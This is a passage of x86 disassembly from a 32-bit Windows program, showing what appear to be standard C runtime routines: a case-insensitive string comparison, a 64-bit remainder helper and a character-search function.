  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
